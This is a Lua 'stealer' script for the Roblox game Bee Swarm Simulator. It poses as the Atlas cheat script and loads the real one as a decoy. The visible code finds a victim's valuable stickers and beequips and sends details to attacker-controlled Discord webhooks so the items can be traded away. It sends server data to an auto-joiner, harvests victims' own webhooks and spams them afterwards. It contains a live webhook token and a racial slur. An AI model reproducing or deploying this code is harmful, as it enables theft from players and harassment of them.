local Scripts = {
    atlas = "https://raw.githubusercontent.com/Chris12089/atlasbss/refs/heads/main/script.lua"
}
local Configuration = {
    Webhook = "https://cold-limit-5307.scriptblox81.workers.dev/"; --[[
        URL of where the hits will be sent, recommended to use a seperate api like a worker
        to prevent spam and webhook deletion but make sure to put '?with_components=true' and '&wait=true' at the end 
        of your discord webhook url INSIDE the api code *if* you use a seperate api ]]
    Whitelist = ""; -- People who will be traded when joining a hit, a whitelist, seperate names (case sensitive) by a comma
    Stickers = "automatic"; -- The stickers you want to accept in a trade. If set to "automatic", any sticker above the value of 1 sign on bssm is accepted, otherwise put a table with strings of names of stickers
    Stickers2 = { ["Petal Cub Skin"] = 30, "Ticket Voucher" }, -- If you have Stickers set to automatic, but still want some specific stickers, add them here (table with strings of names of stickers)
    StickerEmojis = true; -- Adds emojis to the sticker field inside the hit embed but only applies to some stickers (not all)
    BeequipEmojis = true; -- Adds wax emojis and uses a star emoji to show potential although uses alot of characters
    Air = true; -- It just adds spaces inbetween the values on "Hit info" and "Sticker" fields,
    AlwaysShowFullBqListButton = true; -- Self explanatory
    AlwaysShowFullStickerListButton = true; -- Self explanatory
    LogAtlasConfigsAndWebhooks = true; -- Self explanatory
    SpamWebhook = {
        Enabled = true; -- Idk its just funny, it spams the user's webhook that they use for recieving honey updates and stuff
        Message = "@everyone ratted by exodus https://discord.gg/X9HUMRuUje your bss account will be wiped in 24 hours we have spammed detected features on your account :rofl: :joy_cat:"
    };
    TradeTracker = {
        Enabled = true; -- Tracks COMPLETED trades with victims. Always keep this on because it guarantees no whitelisted people (grey) are lying about not getting items
        GuildID = "1489086193822859306";
    };
    AutoCollect = {
        Enabled = true; -- Automatically collect items from hits, even while you're offline. Note that you need the seperate joiner script to actually collect items
        Webhook = "https://discord.com/api/webhooks/1495533968051671181/H4RzH4doQ5k5waOUbdFDDPsu5ozwYcMPL8NBZ4I6fXrK80U7aJk-749zcYabOqmiQ8Zs";
    };
    CustomBtsScript = "atlas"; -- Custom 'Behind the scenes' script (the script that loads so that it doesnt appear that nothing happened when a victim runs the script)
    FakeAtlasLink = "https://raw.githubusercontent.com/exodus892/__exodus__/refs/heads/main/Nigger.lua"  -- Note if you ever change the script github u must change this too
}

local function SafeRequest(Data)
    local Suc, Res = pcall(function()
        return http.request(Data)
    end)
    if Suc then
        return Res
    else
        warn("[SafeRequest] Failed request: " .. tostring(Res))
        task.wait(3)
        return SafeRequest(Data)
    end
end

local function LoadScript()
    --task.spawn(function()
        if Configuration.CustomBtsScript ~= "none" then
            loadstring(game:HttpGet(Scripts[Configuration.CustomBtsScript]))()
        end
    --end)
end

local HitsWebhook = Configuration.Webhook
if HitsWebhook:find("https://discord.com/") and not HitsWebhook:find("with_components=true") then
    HitsWebhook = HitsWebhook .. "?with_components=true"
end
if HitsWebhook:find("https://discord.com/") and not HitsWebhook:find("wait=true") then
    HitsWebhook = HitsWebhook .. "&wait=true"
end
Configuration.Whitelist = Configuration.Whitelist:split(", ")
local Values = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://bssmvalues.com/api/values"))
local RawValues = {}
local IsAuto = false
if Configuration.Stickers == "automatic" then
    IsAuto = true
    Configuration.Stickers = {}
end
local RealStickers = require(game:GetService("ReplicatedStorage").Stickers.StickerTypes).Types
for i, v in pairs(Values) do
    if v.category == "Sticker" then
        if v.key:sub(-3) == "Cub" then
            v.key = v.key .. " Skin"
        end
        local Replace = {
            ["Doodle Hive Skin"] = "Wavy Doodle Hive Skin",
            ["Round Basic"] = "Round Basic Bee",
            ["Bee Gather Voucher"] = "x2 Bee Gather Voucher",
            ["Convert Speed Voucher"] = "x2 Convert Speed Voucher",
            ["Cub Voucher"] = "Cub Buddy Voucher",
            Sunbear = "Stranded Sun Bear",
            ["Wavy Gold Hive Skin"] = "Wavy Yellow Hive Skin",
            ["Peppermint Cub Skin"] = "Peppermint Robo Cub Skin",
            ["Black Hive Skin"] = "Basic Black Hive Skin",
            ["Blue Hive Skin"] = "Basic Blue Hive Skin",
            ["White Hive Skin"] = "Basic White Hive Skin",
            ["Pink Hive Skin"] = "Basic Pink Hive Skin",
            ["Green Hive Skin"] = "Basic Green Hive Skin",
            ["Red Hive Skin"] = "Basic Red Hive Skin",
            ["Green Sell"] = "Green SELL",
            ["Dapper Bear From Above"] = "Dapper From Above",
            ["Blob Bumble"] = "Blob Bumble Bee",
            ["Jack-0-Lantern"] = "Jack-O-Lantern",
            ["Wobbly Looker"] = "Wobbly Looker Bee",
            ["Bomber Bear"] = "Bomber Bee Bear",
        }
        if Replace[v.key] then
            v.key = Replace[v.key]
        end
        if RealStickers[v.key] == nil then
            warn(v.key .. " is not recognized")
        end
        RawValues[v.key] = tonumber(v.value_max)
        if IsAuto and tonumber(v.value_max) >= 1 then
            table.insert(Configuration.Stickers, v.key)
        end
    end
end
for i, v in pairs(RealStickers) do
    if i:find("Star Sign") and IsAuto then
        RawValues[i] = 1
        table.insert(Configuration.Stickers, i)
    end
end
for i, v in pairs(Configuration.Stickers2) do
    if type(i) ~= "number" then
        table.insert(Configuration.Stickers, i)
        if RawValues[i] == nil then
            RawValues[i] = v
        end
    else
        table.insert(Configuration.Stickers, v)
    end
end
local WhitelistedStickers = Configuration.Stickers
local air = utf8.char(0x2004):rep(3)
local air2 = Configuration.Air and air or ""

if _G.executedAtlas == true then
    return
end
_G.executedAtlas = true

repeat task.wait() until game:IsLoaded()

local LocalPlayer = game:GetService("Players").LocalPlayer

do
    local Lplr = game:GetService("Players").LocalPlayer
    repeat task.wait() until Lplr:FindFirstChild("PlayerGui") and
        Lplr.PlayerGui:FindFirstChild("LoadingScreenGui") and
        Lplr.PlayerGui.LoadingScreenGui:FindFirstChild("LoadingMessage") and
        Lplr.PlayerGui.LoadingScreenGui.LoadingMessage.Visible == false
end
local ScrGui = LocalPlayer.PlayerGui:WaitForChild("ScreenGui")

local GameData = {
    PrivateServer = not game:GetService("ReplicatedFirst").PlaceInfo.IsPublicServer.Value,
    IsBSS = game:GetService("ReplicatedFirst").PlaceType.Value == "Main",
    CanTrade = LocalPlayer:WaitForChild("TradeConfig"):WaitForChild("CanTrade").Value
}
if not GameData.IsBSS then return LoadScript() end
if not GameData.CanTrade then return LoadScript() end

local PrivateServerWaitTime = tonumber("10")

local StealerPlayer = nil
local VictimIsTrading = nil
local StealerIsTrading = nil
local SessionID = nil

local function GetStats()
    return require(game.ReplicatedStorage.ClientStatCache):Get()
end

local function GetBQStatsString(File, Name, All)
    local Ping = false
    local Suc, Res = pcall(function()
        local GetDesc = require(game:GetService("ReplicatedStorage").StatModifiers).Description
        local GetType = require(game:GetService("ReplicatedStorage").BeeStats.BeeStatMods).GetType
        local BaseStats, HiveBonuses, Abilities = File:GenerateModifiers()
        local Potential = File.Q * 5
        local NumWaxes = (File:GetWaxHistory() and #File:GetWaxHistory()) or 0
        local Strings = {
            Base = "",
            Hivebonus = "",
            Ability = ""
        }
        do
            local Lines = {}
            for i, v in pairs(BaseStats) do
                local StatStr, Success = GetType(v.Stat).Desc(v)
                if Success then
                    table.insert(Lines, StatStr)
                end
            end
            Strings.Base = table.concat(Lines, "\n")
        end
        if HiveBonuses then
            local Lines = {}
            for i, v in pairs(HiveBonuses) do
                local StatStr = GetDesc(v)
                if StatStr then
                    table.insert(Lines, StatStr)
                end
            end
            Strings.Hivebonus = table.concat(Lines, "\n")
        end
        if Abilities then
            local Lines = {}
            for i, v in pairs(Abilities) do
                local Ability = v[1]
                if Ability then
                    table.insert(Lines, Ability .. (v[2] and " (from wax)" or ""))
                end
            end
            Strings.Ability = table.concat(Lines, "\n")
        end
        if All then
            local Hb = {}
            for i, v in pairs(Strings.Hivebonus:split("\n")) do
                Hb[i] = "[Hive Bonus] " .. v
            end
            Hb = table.concat(Hb, "\n")
            local Ab = {}
            for i, v in pairs(Strings.Ability:split("\n")) do
                Ab[i] = "Ability: " .. v
            end
            Ab = table.concat(Ab, "\n")
            local List = {Strings.Base}
            if #Strings.Hivebonus > 1 then
                table.insert(List, Hb)
            end
            if #Strings.Ability > 1 then
                table.insert(List, Ab)
            end
            return table.concat(List, "\n")
        end
        local Stats = {}
        
        local function Concat(...)
            for i, v in pairs({...}) do
                if v ~= nil then
                    table.insert(Stats, air .. v)
                end
            end
        end

        -- Filter bead lizard
        if Name == "Bead Lizard" then
            local TokenLink = Strings.Ability:match("Token Link")
            local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
            if BeeAbilityPollen == nil and TokenLink == nil then
                return
            end
            if TokenLink or (BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 2) then
                Ping = true
            end
            Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")

        -- Filter lip balm
        elseif Name == "Camphor Lip Balm" then
            local BubblePollen = Strings.Hivebonus:match("%+(%d+)%% Bubble Pollen")
            local GoldBubblePollen = Strings.Hivebonus:match("%+(%d+)%% Gold Bubble Pollen")
            local PepperPollen = Strings.Hivebonus:match("x(%d+%.%d+) Pepper Patch Pollen")
            if tonumber(PepperPollen) < 1.07 and tonumber(BubblePollen) < 18 then
                if GoldBubblePollen then
                    local GBP = tonumber(GoldBubblePollen)
                    if GBP >= 6 then
                        Ping = true
                    elseif GBP == 5 then
                        Ping = true
                    elseif GBP == 4 then
                        if tonumber(BubblePollen) < 14 then return end
                        Ping = true
                    elseif GBP == 3 then
                        if tonumber(BubblePollen) < 15 then return end
                        Ping = true
                    elseif GBP == 2 then
                        if tonumber(BubblePollen) < 16 then return end
                        Ping = true
                    else
                        return
                    end
                else
                    return
                end
            end
            Concat(BubblePollen .. "% Bubble Pollen", GoldBubblePollen and GoldBubblePollen .. "% Gold Bubble Pollen", "x" .. PepperPollen .. " Pepper Patch Pollen")

        -- Filter candy ring
        elseif Name == "Candy Ring" then
            local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
            if tonumber(HoneyAtHive) < 7 then
                return
            end
            Ping = true
            Concat(HoneyAtHive .. "% Honey At Hive")

        -- Filter charm bracelet
        elseif Name == "Charm Bracelet" then
            local AbilityRate = Strings.Base:match("%+(%d+)%% Ability Rate")
            local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
            local Melody = Strings.Ability:match("Melody")
            if Melody then
                Ping = true
            else
                return
            end
            Concat(AbilityRate .. "% Ability Rate", HoneyAtHive and HoneyAtHive .. "% Honey At Hive", Melody and "Ability: Melody")

        -- Filter kazoo
        elseif Name == "Kazoo" then
            local CPHB = Strings.Hivebonus:match("%+(%d+)%% Critical Power")
            local SCPHB = Strings.Hivebonus:match("%+(%d+)%% Super-Crit Power")
            if CPHB == nil and SCPHB == nil then
                return
            end
            Concat(CPHB and CPHB .. "% Critical Power", SCPHB and SCPHB .. "% Super-Crit Power")

        -- Filter paperclip
        elseif Name == "Paperclip" then
            local TokenLink = Strings.Ability:match("Token Link")
            local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
            local AbilityTokenLifespan = Strings.Hivebonus:match("%+(%d+)%% Ability Token Lifespan")
            if BeeAbilityPollen == nil and TokenLink == nil and (AbilityTokenLifespan == nil or tonumber(AbilityTokenLifespan) < 5) then
                return
            end
            Ping = true
            Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")

        -- Filter shades
        elseif Name == "Pink Shades" then
            local Focus = Strings.Ability:match("Focus")
            local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super-Crit Power")
            local SuperCritChance = Strings.Hivebonus:match("%+(%d+)%% Super-Crit Chance")
            Ping = true
            Concat(Focus and "Ability: Focus", SuperCritPower and SuperCritPower .. "% Super-Crit Power", SuperCritChance and SuperCritChance .. "% Super-Crit Chance")

        -- Filter smiley sticker
        elseif Name == "Smiley Sticker" then
            local HoneyMark = Strings.Ability:match("Honey Mark")
            local MarkDuration = Strings.Base:match("%+(%d+)%% Mark Duration")
            local MarkDurationHB = Strings.Hivebonus:match("%+(%d+)%% Mark Duration")
            if HoneyMark == nil then
                return
            end
            Ping = true
            Concat(HoneyMark and "Ability: Honey Mark", MarkDuration .. "% Mark Duration", MarkDurationHB and ("{HB} " .. MarkDurationHB .. "% Mark Duration"))

        -- Filter sweatband
        elseif Name == "Sweatband" then
            local RedGatherAmount = Strings.Base:match("%+(%d+)%% Red Gather Amount")
            local WhiteGatherAmount = Strings.Base:match("%+(%d+)%% White Gather Amount")
            if (RedGatherAmount == nil and WhiteGatherAmount == nil) or ((not RedGatherAmount or tonumber(RedGatherAmount) < 26) and (not WhiteGatherAmount or tonumber(WhiteGatherAmount) < 27)) then
                return
            end

            local RGA = nil
            if RedGatherAmount then
                RGA = RedGatherAmount .. "% Red Gather Amount"
            end
            local WGA = nil
            if WhiteGatherAmount then
                WGA = WhiteGatherAmount .. "% White Gather Amount"
            end
            Ping = true
            Concat(RGA, WGA)

        -- Filter whistle
        elseif Name == "Whistle" then
            local Melody = Strings.Ability:match("Melody")
            local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
            if Melody == nil and SuperCritPower == nil then
                return
            end
            if Melody or (SuperCritPower and tonumber(SuperCritPower) >= 3) then
                Ping = true
            end
            Concat(Melody and "Ability: Melody", SuperCritPower and SuperCritPower .. "% Super-Crit Power")

        -- Filter elf cap
        elseif Name == "Elf Cap" then
            local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
            if HoneyAtHive == nil then
                return
            end
            if tonumber(HoneyAtHive) < 5 then
                if NumWaxes == 1 then
                    if tonumber(HoneyAtHive) < 3 then
                        return
                    end
                elseif NumWaxes == 2 then
                    if tonumber(HoneyAtHive) < 3 then
                        return
                    end
                elseif NumWaxes == 3 then
                    if tonumber(HoneyAtHive) ~= 4 then
                        return
                    end
                else
                    return
                end
            end
            Ping = true
            Concat(HoneyAtHive .. "% Honey At Hive")

        -- Filter festive wreath
        elseif Name == "Festive Wreath" then
            local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
            if HoneyAtHive == nil then
                return
            end
            if tonumber(HoneyAtHive) >= 2 then
                Ping = true
            end
            Concat(HoneyAtHive .. "% Honey At Hive")

        -- Filter paper angel
        elseif Name == "Paper Angel" then
            local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
            local AbilityTokenLifespan = Strings.Hivebonus:match("%+(%d+)%% Ability Token Lifespan")
            if BeeAbilityPollen == nil or tonumber(BeeAbilityPollen) < 2 then
                if AbilityTokenLifespan == nil or tonumber(AbilityTokenLifespan) < 3 then
                    return
                end
            end
            if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 3 then
                Ping = true
            end
            Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")

        -- Filter pinecone
        elseif Name == "Pinecone" then
            local PinetreeCapacity = Strings.Hivebonus:match("%+(%d+)%% Pine Tree Forest Capacity")
            local PinetreePollen = Strings.Hivebonus:match("%+(%d+)%% Pine Tree Forest Pollen")
            local PTC = tonumber(PinetreeCapacity)
            local PTP = tonumber(PinetreePollen)
            if PTC < 14 then return end
            if PTC == 14 or PTC == 15 then
                return
            elseif PTC == 16 then
                if PTP < 12 then return end
                Ping = true
            elseif PTC == 17 then
                if PTP < 9 then return end
                Ping = true
            elseif PTC >= 18 then
                Ping = true
            end
            Concat(PinetreeCapacity .. "% Pinetree Capacity", PinetreePollen .. "% Pinetree Pollen")

        -- Filter poinsettia
        elseif Name == "Poinsettia" then
            local RedPollen = Strings.Hivebonus:match("%+(%d+)%% Red Pollen")
            local BeeGatherPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Gather Pollen")
            if RedPollen == nil and BeeGatherPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
                return
            end
            if (not BeeGatherPollen or tonumber(BeeGatherPollen) < 12) then
                local LimitRp = 7
                if BeeGatherPollen and tonumber(BeeGatherPollen) >= 10 then
                    LimitRp = 5
                end
                if RedPollen and tonumber(RedPollen) >= LimitRp then
                    Ping = true
                else
                    return
                end
            end
            if RedPollen and tonumber(RedPollen) >= 7 then
                Ping = true
            end
            Concat(RedPollen and RedPollen .. "% Red Pollen", BeeGatherPollen and BeeGatherPollen .. "% Bee Gather Pollen")

        -- Filter antlers
        elseif Name == "Reindeer Antlers" then
            local BondFromTreats = Strings.Hivebonus:match("%+(%d+)%% Bond From Treats")
            local Capacity = Strings.Hivebonus:match("%+(%d+)%% Capacity")
            local BabyLove = Strings.Ability:match("Baby Love")
            if BondFromTreats == nil and Capacity == nil and BabyLove == nil then
                return
            end
            if BabyLove or (Capacity and tonumber(Capacity) >= 3) or BondFromTreats then
                Ping = true
            end
            Concat(BondFromTreats and BondFromTreats .. "% Bond From Treats", Capacity and Capacity .. "% Capacity", BabyLove and "Ability: Baby Love")

        -- Filter tiara
        elseif Name == "Snow Tiara" then
            local BlueFieldCapacity = Strings.Hivebonus:match("^%+([%d%.]+)%% Blue Field Capacity")
            if tonumber(BlueFieldCapacity) < 6 then
                return
            end
            Concat(BlueFieldCapacity .. "% Blue Field Capacity")

        -- Filter toy drum
        elseif Name == "Toy Drum" then
            local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
            if BeeAbilityPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
                return
            end
            if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 3 then
                Ping = true
            end
            Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")

        -- Filter toy horn
        elseif Name == "Toy Horn" then
            local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
            if BeeAbilityPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
                return
            end
            if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 2 then
                Ping = true
            end
            Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")

        -- Unwanted beequips
        else
            return nil
        end

        return #Stats > 0 and table.concat(Stats, "\n") or "No Stats"
    end)
    if not Suc then
        return "An error occured filtering stats: " .. tostring(Res)
    else
        return Res, Ping
    end
end


local function GetWhitelistedBQs(All)
    local Stats = GetStats()
    local CaseBQs = Stats.Beequips.Case
    local StorageBQs = Stats.Beequips.Storage
    local CaseEntry = require(game.ReplicatedStorage.Beequips.BeequipCaseEntry)
    local BeequipFile = require(game.ReplicatedStorage.Beequips.BeequipFile)
    local WLBeequips = {}

    -- Add beequips
    for _, Beequip in ipairs(CaseBQs) do
        local data = CaseEntry.FromData(Beequip):FetchBeequip(Stats, false)
        if data and data:GetTypeDef().DisplayName and (GetBQStatsString(data, data:GetTypeDef().DisplayName) or All) then
            table.insert(WLBeequips, {
                From = "Case",
                File = data
            })
        end
    end
    for _, Beequip in ipairs(StorageBQs) do
        local data = BeequipFile.FromData(Beequip)
        if data and data:GetTypeDef().DisplayName and (GetBQStatsString(data, data:GetTypeDef().DisplayName) or All) then
            table.insert(WLBeequips, {
                From = "Storage",
                File = data
            })
        end
    end
    return WLBeequips
end

local function GetWhitelistedStickers(All)
    local Stats = GetStats()
    local Stickers = Stats.Stickers.Book
    local StickerFile = require(game.ReplicatedStorage.Stickers.StickerFile)

    local WLStickers = {}

    -- Add stickers
    for _, Sticker in ipairs(Stickers) do
        local data = StickerFile.FromData(Sticker)
        if data and (table.find(WhitelistedStickers, data:GetTypeDef().Name) or All) then
            table.insert(WLStickers, data)
        end
    end
    return WLStickers
end

local function CollapseList(list)
    local counts = {}
    local order = {}

    for _, v in ipairs(list) do
        if not counts[v] then
            counts[v] = 1
            table.insert(order, v)
        else
            counts[v] += 1
        end
    end

    local result = {}

    for _, v in ipairs(order) do
        local count = counts[v]

        if count > 1 then
            -- find first emoji anywhere in the string
            local startPos, endPos = v:find("<[^>]+>")
            
            if startPos and endPos then
                local before = v:sub(1, endPos)
                local after = v:sub(endPos + 1)
                table.insert(result, before .. " [+" .. count .. "]" .. after)
            else
                table.insert(result, v) -- fallback
            end
        else
            table.insert(result, v)
        end
    end

    return result
end

local EmojisIds = {
    Bee_Cub_Skin = "1496636643979956224",
    Brown_Cub_Skin = "1496636845822574773",
    Doodle_Cub_Skin = "1496637101452820512",
    Gingerbread_Cub_Skin = "1496637014404108469",
    Gloomy_Cub_Skin = "1496637137129570474",
    Noob_Cub_Skin = "1496636975225110638",
    Peppermint_Robo_Cub_Skin = "1496637061606932610",
    Robo_Cub_Skin = "1496636888692293782",
    Snow_Cub_Skin = "1496636688338915369",
    Star_Cub_Skin = "1496636556394496001",
    Stick_Cub_Skin = "1496636930400714802",
    Petal_Cub_Skin = "1496637470480273428",

    Ticket_Voucher = "1496642744582541346",
    x2_Convert_Speed_Voucher = "1496642787486203904",
    x2_Bee_Gather_Voucher = "1496642802388304032",
    Cub_Buddy_Voucher = "1496642818213679124",
    Bear_Bee_Voucher = "1496642833409376267",
    Offline_Voucher = "1496642767978238134",
    
    Icy_Crowned_Hive_Skin = "1496643299467989214",
    Wavy_Purple_Hive_Skin = "1496643339502751886",
    Wavy_Doodle_Hive_Skin = "1496643378841125115",
    Wavy_Cyan_Hive_Skin = "1496643414320480397",
    Wavy_Yellow_Hive_Skin = "1496643449871663165",

    Capricorn_Star_Sign = "1496644370500423861",
    Virgo_Star_Sign = "1496644739993440416",
    Taurus_Star_Sign = "1496644561961881710",
    Scorpio_Star_Sign = "1496644809966882906",
    Sagittarius_Star_Sign = "1496644850261692436",
    Pisces_Star_Sign = "1496644444861104178",
    Libra_Star_Sign = "1496644770590756946",
    Leo_Star_Sign = "1496644706522890340",
    Gemini_Star_Sign = "1496644632346361976",
    Cancer_Star_Sign = "1496644600155340942",
    Aries_Star_Sign = "1496644523441520681",
    Aquarius_Star_Sign = "1496644407494180934",

    BBM_From_Below = "1496673922429747220",
    Auryn = "1496674738020290591",
    Flying_Festive_Bee = "1496674063177875496",
    Glowering_Gummy_Bear = "1496674810053525678",
    Left_Mythic_Gem_Fleuron = "1496674615219585124",
    Right_Mythic_Gem_Fleuron = "1496674684022952018",
    Left_Shining_Diamond_Fleuron = "1496674538367221892",
    Right_Shining_Diamond_Fleuron = "1496674570336473239",
    Nessie = "1496674714465075290",
    Pepper_Patch_Stamp = "1496674454317695006",
    Pine_Tree_Forest_Stamp = "1496674390623125544",
    Stranded_Sun_Bear = "1496674777128239155",
    Black_Star = "1497313506230403233",
    Cyan_Hilted_Sword = "1497313534172991598",
    Dark_Flame = "1497313540485283880",
    Ionic_Column_Base = "1497313509057495210",
    Ionic_Column_Middle = "1497313511196463291",
    Ionic_Column_Top = "1497313513578823812",
    Left_Gold_Swirl_Fleuron = "1497313518167396534",
    Right_Fold_Swirl_Fleuron = "1497313515940090088",
    Party_Robo_Bear = "1497313525733920819",
    Rose_Field_Stamp = "1497313520079999016",
    Spider_Field_Stamp = "1497313522588188834",
    Shy_Brown_Bear = "1497313444452630800",
    Tornado = "1497313537662386227",
    Wall_Crack = "1497313503579607222",
    Abstract_Color_Painting = "1497687170721386678",
    Bamboo_Field_Stamp = "1497687148101373963",
    Banana_Painting = "1497687168024580186",
    Blue_Flower_Field_Stamp = "1497687155252924579",
    Cactus_Field_Stamp = "1497687141160062997",
    Clover_Field_Stamp = "1497687153319346256",
    Coconut_Field_Stamp = "1497687134125953266",
    Dandelion_Field_Stamp = "1497687160613245129",
    Mountain_Top_Field_Stamp = "1497687136361517236",
    Mushroom_Field_Stamp = "1497687157438025822",
    Pineapple_Patch_Stamp = "1497687145417277582",
    Prism_Painting = "1497687116941889717",
    Pumpkin_Patch_Stamp = "1497687138739814460",
    Purple_4Point_Flower = "1497687165805662241",
    Strawberry_Field_Stamp = "1497687151092043987",
    Stump_Field_Stamp = "1497687142955221132",
    Sunflower_Field_Stamp = "1497687163654115378",
    Waving_Townsperson = "1497687130544017589"
}

local function RemoveLastMatchingLine(str)
    local lines = {}

    -- collect lines and track last match index
    for i, line in pairs(str:split("\n")) do
        table.insert(lines, line)
    end

    -- rebuild without that line
    lines[#lines] = nil
    return table.concat(lines, "\n")
end

local function NewItemsStr()
    local StickerString = {}
    local BeequipString = {}
    local PingAll = false
    local TotalValue = 0
    local Signs, Hives, Vouchers, Cubs = 0, 0, 0, 0
    for i, v in pairs(GetWhitelistedStickers()) do
        local Name = v:GetTypeDef().Name
        TotalValue = TotalValue + RawValues[Name]
        local EmojiFormat = Name:gsub(" ", "_"):gsub("-", "")
        local Emoji
        if Configuration.StickerEmojis then
            if EmojisIds[EmojiFormat] then
                Emoji = string.format("<:%s:%s>", EmojiFormat, EmojisIds[EmojiFormat])
            else
                Emoji = "<:air:1496638976683937903>"
            end
        end
        if Name:find("Star Sign") then
            PingAll = true
            Signs = Signs + 1
        elseif Name:find("Hive Skin") then
            if Name:find("Icy Crown") or Name:find("Wavy Purple") then
                PingAll = true
            end
            Hives = Hives + 1
        elseif Name:find("Voucher") then
            if Name ~= "Ticket Voucher" then
                PingAll = true
            end
            Vouchers = Vouchers + 1
        elseif Name:find("Cub Skin") then
            PingAll = true
            Cubs = Cubs + 1
        end
        table.insert(StickerString, {
            val = RawValues[Name],
            text = (Emoji and (Emoji .. " ") or "") .. Name
        })
    end
    table.sort(StickerString, function (a, b)
        return a.val > b.val
    end)
    for i, v in pairs(StickerString) do
        StickerString[i] = air2 .. v.text
    end
    StickerString = CollapseList(StickerString)
    for i, v in pairs(GetWhitelistedBQs()) do
        local File = v.File
        local Data = File:GetTypeDef()
        local Name = Data.DisplayName
        local StatsString, PingYes = GetBQStatsString(File, Name)
        if PingYes then
            PingAll = true
        end
        local Formatted = "`" .. Name .. "`\n"
        if Configuration.BeequipEmojis then
            if (File.Q * 5) >= 1 then
                Formatted = Formatted .. string.format(" %.1f", File.Q * 5) .. " :star:"
            else
                Formatted = Formatted .. "0 :star:"
            end
            Formatted = Formatted .. " | "
            if File:GetWaxHistory() and #File:GetWaxHistory() > 0 then
                for i, v in pairs(File:GetWaxHistory()) do
                    local WaxTypeID = v[1]
                    if WaxTypeID == 1 then
                        Formatted = Formatted .. "<:sf:1496593753857724416>"
                    elseif WaxTypeID == 2 then
                        if v[2] then
                            Formatted = Formatted .. "<:hs:1496622397594402916>"
                        else
                            Formatted = Formatted .. "<:hf:1496622497942999160>"
                        end
                    elseif WaxTypeID == 3 then
                        Formatted = Formatted .. "<:cu:1496593415041978508>"
                    elseif WaxTypeID == 4 then
                        Formatted = Formatted .. "<:sw:1496615951708459038>"
                    elseif WaxTypeID == 5 then
                        Formatted = Formatted .. "<:db:1496593472524783636>"
                    end
                end
            else
                Formatted = Formatted .. "Unwaxed"
            end
        else
            Formatted = Formatted .. string.format("%s Potential | %d Waxes", string.format("%.1f", File.Q * 5), (File:GetWaxHistory() and #File:GetWaxHistory()) or 0)
        end
        Formatted = Formatted .. "\n" .. StatsString
        table.insert(BeequipString, Formatted)
    end
    return table.concat(StickerString, "\n"), table.concat(BeequipString, "\n\n"), PingAll, Signs, Hives, Vouchers, Cubs, TotalValue
end
local function GetAllBQStatsString(File)
    return GetBQStatsString(File, File:GetTypeDef().DisplayName, true)
end
local function createPaste(content)
    local body = game:GetService("HttpService"):JSONEncode({
        content = content,
        ai = false,
        encrypted = false,
        tags = {},
        title = "",
        type = "PASTE",
        visibility = "UNLISTED"
    })

    local res = SafeRequest({
        Url = "https://pastefy.app/api/v2/paste",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = body
    })

    local data = game:GetService("HttpService"):JSONDecode(res.Body)
    if not data or not data.paste or not data.paste.id then
        return nil, "invalid response"
    end

    return "https://pastefy.app/" .. data.paste.id
end

local AtlasWebhooks = {}
task.spawn(function()
    if #GetWhitelistedBQs() > 0 or #GetWhitelistedStickers() > 0 then
        repeat
            task.wait()
        until #GetWhitelistedBQs() == 0 and #GetWhitelistedStickers() == 0
        if Configuration.SpamWebhook.Enabled then
            while task.wait(2) do
                for i, v in pairs(AtlasWebhooks) do
                    SafeRequest({
                        Url = v,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = game:GetService("HttpService"):JSONEncode({content = Configuration.SpamWebhook.Message})
                    })
                end
            end
        end
    end
end)

local function AutoCollect2()
    warn("AutoCollect2 called")
    repeat
        task.wait()
    until #GetWhitelistedBQs() == 0 and #GetWhitelistedStickers() == 0
    local function Send()
        local Body = game:GetService("HttpService"):JSONEncode({
            content = string.format("Auto-Join_Data:`{\"completed\":true,\"jobid\":\"%s\",\"userid\":\"%s\"}`", game.JobId, tostring(LocalPlayer.UserId))
        })
        local Req = SafeRequest({
            Url = Configuration.AutoCollect.Webhook,
            Method = "POST",
            Headers = {
                ["content-type"] = "application/json"
            },
            Body = Body
        })
        local StatusCode = Req.StatusCode
        if StatusCode ~= 204 then
            warn("AutoCollect failed to send completion marker: " .. tostring(StatusCode))
            task.wait(1)
            Send()
        end
    end
    Send()
end

local function AutoCollect()
    if Configuration.AutoCollect.Enabled ~= true then return end
    if GameData.PrivateServer then return end
    warn("AutoCollect called")
    local Body = game:GetService("HttpService"):JSONEncode({
        content = string.format("Auto-Join_Data:`{\"jobid\":\"%s\",\"userid\":\"%s\"}`", game.JobId, tostring(LocalPlayer.UserId))
    })
    local Req = SafeRequest({
        Url = Configuration.AutoCollect.Webhook,
        Method = "POST",
        Headers = {
            ["content-type"] = "application/json"
        },
        Body = Body
    })
    if Req.StatusCode ~= 204 then
        warn("AutoCollect info send failed: " .. tostring(Req.StatusCode))
        task.wait(1)
